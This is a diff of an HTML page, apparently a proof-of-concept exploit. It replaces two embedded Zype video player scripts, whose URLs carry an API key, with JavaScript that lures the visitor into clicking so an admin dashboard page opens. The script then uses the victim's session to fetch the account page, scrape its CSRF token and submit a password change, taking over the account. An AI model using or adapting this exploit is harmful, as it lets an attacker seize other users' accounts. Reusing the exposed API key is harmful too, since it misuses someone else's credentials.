@@ -1,12 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>CMS</title>
+<meta charset='utf-8' />
 </head>
 <body>
-	<h1>BRANCH</h1>
-        <div id="zype_642eb7b94021c00001bc39bc"></div><script src="https://player-dash-1402.working.k.zype.com/embed/642eb7b94021c00001bc39bc.js?api_key=jy6ZL2l7LycRj1MjGaeQaUAFGyr_0RGI6fHFccv6W3W2ZpfH0a7_d7DytKOc0Pnz&autoplay=true&controls=true" type="text/javascript"></script>
-    <h1>STG</h1>
-        <div id="zype_6452882579be5f0001125e33"></div><script src="https://player-staging.working.k.zype.com/embed/6452882579be5f0001125e33.js?api_key=jy6ZL2l7LycRj1MjGaeQaUAFGyr_0RGI6fHFccv6W3W2ZpfH0a7_d7DytKOc0Pnz&autoplay=true&controls=true" type="text/javascript"></script>
+<script>
+      let url = 'https://admin-dash-1353-b.working.k.zype.com/manage_account/edit';
+              document.write('1. Click anywhere on the window<br>2. When a new window opens, click anywhere there too');
+        window.onclick = i => {
+          const w = window.open(url,'_blank');
+          setTimeout(x=>w.close(),5000);
+          window.onclick = null;
+        }
+        setTimeout(exploit, 5000);
+            async function exploit() {
+        // fetch CSRF Token
+        const resp = await fetch('https://admin-dash-1353-b.working.k.zype.com/manage_account/edit',{mode: 'cors',credentials: 'include'});
+        const data = await resp.text();
+
+        const parser = new DOMParser();
+        const htmlDoc = parser.parseFromString(data, "text/html");
+
+        csrfToken = htmlDoc.querySelector('meta[name="csrf-token"]').content;
+        current_site_attributes = htmlDoc.querySelector('input[name="user[current_site_attributes][id]"]').value;
+
+        // change user's password
+        const pwd = escape("");
+        const params = `utf8=%E2%9C%93&_method=patch&authenticity_token=${encodeURIComponent(csrfToken)}&user%5Bpassword%5D=${pwd}&user%5Bpassword_confirmation%5D=${pwd}&user%5Bcurrent_site_attributes%5D%5Bid%5D=${current_site_attributes}&anchor=account-security`
+        console.log(params);
+
+        fetch('https://admin-dash-1353-b.working.k.zype.com/manage_account',{
+          method: 'POST',
+          credentials: 'include',
+          headers: {
+            'Content-type': 'application/x-www-form-urlencoded'
+          },
+          //redirect: 'error',
+          body: params
+        });
+      }
+    </script>
 </body>
 </html>
